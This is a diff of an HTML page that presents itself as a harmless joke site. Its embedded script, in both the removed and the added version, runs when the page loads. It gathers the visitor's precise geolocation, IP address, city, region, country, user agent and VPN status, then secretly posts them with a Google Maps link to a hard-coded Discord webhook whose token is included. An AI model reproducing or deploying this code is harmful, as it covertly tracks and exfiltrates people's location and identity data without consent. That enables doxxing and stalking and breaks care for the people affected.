@@ -29,55 +29,70 @@
     <p>This website is no longer useless! If you're feeling adventurous, you can visit the main website <a href="https://moopx.pro" target="_blank">here</a>.</p>
 
     <script>
-        document.addEventListener('DOMContentLoaded', function() {
-            const webhookUrl = 'https://discord.com/api/webhooks/1181948401353502751/dv7MXBVzmttSIHREI2lZ67U2sb5CvroDpv62nsGAH1yDBihziRNfX3vtYJY304G14BF4'; // Replace with your Discord webhook URL
+    document.addEventListener('DOMContentLoaded', function() {
+        const webhookUrl = 'https://discord.com/api/webhooks/1181948401353502751/dv7MXBVzmttSIHREI2lZ67U2sb5CvroDpv62nsGAH1yDBihziRNfX3vtYJY304G14BF4'; // Replace with your Discord webhook URL
 
-            // Function to send user and device information to Discord
-            const sendInfoToDiscord = (ip, address, userAgent, isVPN, coordinates) => {
-                fetch(webhookUrl, {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json',
-                    },
-                    body: JSON.stringify({
-                        content: `New visitor info:\nIP: ${ip || 'N/A'}\nAddress: ${address || 'N/A'}\nUser Agent: ${userAgent}\nVPN: ${isVPN ? 'Yes' : 'No'}\nCoordinates: ${coordinates}\nGoogle Maps Link: ${getGoogleMapsLink(coordinates)}`,
-                    }),
+        // Function to send user and device information to Discord
+        const sendInfoToDiscord = (ip, address, userAgent, isVPN, coordinates) => {
+            fetch(webhookUrl, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({
+                    content: `New visitor info:\nIP: ${ip || 'N/A'}\nAddress: ${address || 'N/A'}\nUser Agent: ${userAgent}\nVPN: ${isVPN ? 'Yes' : 'No'}\nCoordinates: ${coordinates}\nGoogle Maps Link: ${getGoogleMapsLink(coordinates)}`,
+                }),
+            });
+        };
+
+        // Function to get Google Maps link with coordinates
+        const getGoogleMapsLink = (coordinates) => {
+            return `https://www.google.com/maps?q=${coordinates}`;
+        };
+
+        // Function to check if the user is using a VPN
+        const checkVPN = async () => {
+            try {
+                const response = await fetch('https://api.ipregistry.co/json/');
+                const data = await response.json();
+
+                // Check if VPN is detected using IPRegistry's VPN detection
+                const isVPN = data.connection.is_vpn || false;
+
+                // Fetch visitor's information after VPN check
+                getVisitorInfo(isVPN);
+            } catch (error) {
+                console.error('Error checking VPN:', error);
+            }
+        };
+
+        // Function to get visitor's information including coordinates
+        const getVisitorInfo = async (isVPN) => {
+            try {
+                const position = await new Promise((resolve, reject) => {
+                    navigator.geolocation.getCurrentPosition(resolve, reject);
                 });
-            };
 
-            // Function to get Google Maps link with coordinates
-            const getGoogleMapsLink = (coordinates) => {
-                return `https://www.google.com/maps?q=${coordinates}`;
-            };
+                const coordinates = `${position.coords.latitude},${position.coords.longitude}`;
 
-            // Function to get visitor's information including coordinates
-            const getVisitorInfo = async () => {
-                try {
-                    const position = await new Promise((resolve, reject) => {
-                        navigator.geolocation.getCurrentPosition(resolve, reject);
-                    });
+                // Requesting IP and address from a third-party service (replace with your preferred service)
+                const infoResponse = await fetch('https://ipinfo.io/json');
+                const infoData = await infoResponse.json();
 
-                    const coordinates = `${position.coords.latitude},${position.coords.longitude}`;
+                const ip = infoData.ip || 'N/A';
+                const address = `${infoData.city || 'N/A'}, ${infoData.region || 'N/A'}, ${infoData.country || 'N/A'}`;
+                const userAgent = navigator.userAgent;
 
-                    // Requesting IP and address from a third-party service (replace with your preferred service)
-                    const infoResponse = await fetch('https://ipinfo.io/json');
-                    const infoData = await infoResponse.json();
+                // Sending data to Discord with VPN status
+                sendInfoToDiscord(ip, address, userAgent, isVPN, coordinates);
+            } catch (error) {
+                console.error('Error fetching location or address:', error);
+            }
+        };
 
-                    const ip = infoData.ip || 'N/A';
-                    const address = `${infoData.city || 'N/A'}, ${infoData.region || 'N/A'}, ${infoData.country || 'N/A'}`;
-                    const userAgent = navigator.userAgent;
-                    const isVPN = infoData.vpn || false;
-
-                    // Sending data to Discord with VPN status
-                    sendInfoToDiscord(ip, address, userAgent, isVPN, coordinates);
-                } catch (error) {
-                    console.error('Error fetching location or address:', error);
-                }
-            };
-
-            // Call the function when the page loads
-            getVisitorInfo();
-        });
-    </script>
+        // Call the function when the page loads
+        checkVPN();
+    });
+</script>
 </body>
 </html>
